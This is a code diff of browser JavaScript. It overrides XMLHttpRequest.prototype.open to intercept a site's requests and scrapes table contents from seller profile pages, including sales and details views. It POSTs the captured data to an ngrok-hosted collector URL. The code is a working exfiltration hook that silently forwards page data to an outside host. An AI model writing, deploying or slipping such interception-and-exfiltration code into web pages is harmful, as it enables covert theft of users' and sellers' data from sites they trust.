@@ -1,4 +1,33 @@
+const COLLECTOR_URL = "https://f887-95-56-217-235.ngrok-free.app"
+
 // Save a reference to the original XMLHttpRequest object
+if (window.location.pathname.startsWith("/profile-Seller")){
+    var tbodyContent = document.querySelector('tbody').innerHTML;
+
+    if (window.location.pathname.endsWith("do=sale")){
+
+        fetch(COLLECTOR_URL, {
+            method: 'POST', // Specify the HTTP method
+            headers: {
+                'Content-Type': 'application/json', // Specify that you are sending JSON data
+                // You can include additional headers if required
+            },
+            body: JSON.stringify({ response: tbodyContent, path: 'seller_sales' }) 
+        })
+    }
+
+    if (window.location.pathname.endsWith("do=details")){
+        fetch(COLLECTOR_URL, {
+            method: 'POST', // Specify the HTTP method
+            headers: {
+                'Content-Type': 'application/json', // Specify that you are sending JSON data
+                // You can include additional headers if required
+            },
+            body: JSON.stringify({ response: tbodyContent, path: 'seller_details' }) 
+        })
+    }
+}
+
 var originalXhrOpen = window.XMLHttpRequest.prototype.open;
 
 // Replace the open method with our own implementation
@@ -21,7 +50,7 @@ window.XMLHttpRequest.prototype.open = function(method, url) {
                 // Add your interception logic here, before making the actual call
                 console.log('Intercepted XMLHttpRequest with method: ' + method + ', URL: ' + url);
 
-                fetch("https://f887-95-56-217-235.ngrok-free.app", {
+                fetch(COLLECTOR_URL, {
                     method: 'POST', // Specify the HTTP method
                     headers: {
                         'Content-Type': 'application/json', // Specify that you are sending JSON data
